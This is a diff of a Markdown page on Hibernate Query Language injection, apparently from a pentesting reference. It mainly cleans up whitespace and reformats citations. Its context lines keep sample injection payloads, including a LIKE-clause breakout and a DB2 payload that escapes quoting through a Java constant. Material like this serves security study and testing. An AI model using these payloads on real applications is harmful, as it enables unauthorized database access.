@@ -1,4 +1,4 @@
-# Hibernate Query Language Injection 
+# Hibernate Query Language Injection
 
 > Hibernate ORM (Hibernate in short) is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-oriented domain model to a relational database. - Wikipedia
 
@@ -28,7 +28,7 @@ HQL does not support comments
 ```sql
 from BlogPosts
 where title like '%'
-  and DOESNT_EXIST=1 and ''='%' -- 
+  and DOESNT_EXIST=1 and ''='%' --
   and published = true
 ```
 
@@ -120,7 +120,7 @@ Hibernate resolves Java public static fields (Java constants) in HQL queries:
 - Ex. `java.lang.Character.SIZE` is resolved to 16
 - String or char constants are additionally surrounded by single quotes
 
-To use JAVA CONSTANTS method we need special char or  string fields declared in classes or interfaces on classpath.
+To use JAVA CONSTANTS method we need special char or string fields declared in classes or interfaces on classpath.
 
 ```java
 public class Constants {
@@ -150,15 +150,12 @@ org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE  [ EclipseHelp ]
 dummy' and hqli.persistent.Constants.C_QUOTE_1*X('<>CHAR(41) and (select count(1) from sysibm.sysdummy1)>0 --')=1 and '1'='1
 ```
 
-## Methods by DBMS
-
-![image](https://user-images.githubusercontent.com/16578570/163428666-a22105a8-287c-4997-8aef-8f372a1b86e9.png)
 
 ## References
 
-* [HQL for pentesters - February 12, 2014 - Philippe Arteau](https://blog.h3xstream.com/2014/02/hql-for-pentesters.html)
-* [How to put a comment into HQL (Hibernate Query Language)? - Thomas Bratt](https://stackoverflow.com/questions/3196975/how-to-put-a-comment-into-hql-hibernate-query-language)
-* [HQL : Hyperinsane Query Language - 04/06/2015 - Renaud Dubourguais](https://www.synacktiv.com/ressources/hql2sql_sstic_2015_en.pdf)
-* [ORM2Pwn: Exploiting injections in Hibernate ORM - Nov 26, 2015 - Mikhail Egorov](https://www.slideshare.net/0ang3el/orm2pwn-exploiting-injections-in-hibernate-orm)
-* [New Methods for Exploiting ORM Injections in Java Applications - HITBSecConf2016 - Mikhail Egorov - Sergey Soldatov](https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf)
-* [HQL Injection Exploitation in MySQL - July 18, 2019 - Olga Barinova](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/hql-injection-exploitation-in-mysql/)
+- [HQL for pentesters - Philippe Arteau - February 12, 2014](https://blog.h3xstream.com/2014/02/hql-for-pentesters.html)
+- [How to put a comment into HQL (Hibernate Query Language)? - Thomas Bratt - July 7, 2010](https://stackoverflow.com/questions/3196975/how-to-put-a-comment-into-hql-hibernate-query-language)
+- [HQL: Hyperinsane Query Language - Renaud Dubourguais - June 4, 2015](https://www.synacktiv.com/ressources/hql2sql_sstic_2015_en.pdf)
+- [ORM2Pwn: Exploiting injections in Hibernate ORM - Mikhail Egorov - November 26, 2015](https://www.slideshare.net/0ang3el/orm2pwn-exploiting-injections-in-hibernate-orm)
+- [New Methods for Exploiting ORM Injections in Java Applications - HITBSecConf2016 - Mikhail Egorov - Sergey Soldatov - October 16, 2016](https://web.archive.org/web/20161016220026/https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf)
+- [HQL Injection Exploitation in MySQL - Olga Barinova - July 18, 2019](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/hql-injection-exploitation-in-mysql/)
